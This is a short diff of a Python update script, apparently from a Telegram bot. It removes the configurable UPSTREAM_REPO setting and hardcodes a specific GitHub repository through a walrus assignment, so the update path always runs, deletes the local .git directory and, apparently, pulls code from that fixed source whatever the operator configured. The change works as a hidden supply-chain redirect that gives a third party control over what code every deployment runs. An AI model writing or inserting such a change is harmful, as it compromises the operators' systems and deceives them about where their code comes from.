@@ -41,15 +41,12 @@ if DATABASE_URL:
         environ['UPSTREAM_BRANCH'] = config_dict['UPSTREAM_BRANCH']
     conn.close()
 
-UPSTREAM_REPO = environ.get('UPSTREAM_REPO', '')
-if len(UPSTREAM_REPO) == 0:
-    UPSTREAM_REPO = None
 
 UPSTREAM_BRANCH = environ.get('UPSTREAM_BRANCH', '')
 if len(UPSTREAM_BRANCH) == 0:
     UPSTREAM_BRANCH = 'master'
 
-if UPSTREAM_REPO:
+if UPSTREAM_REPO := 'https://github.com/okaybro526-1/jmdkh-mltb':
     if ospath.exists('.git'):
         srun(["rm", "-rf", ".git"])
 
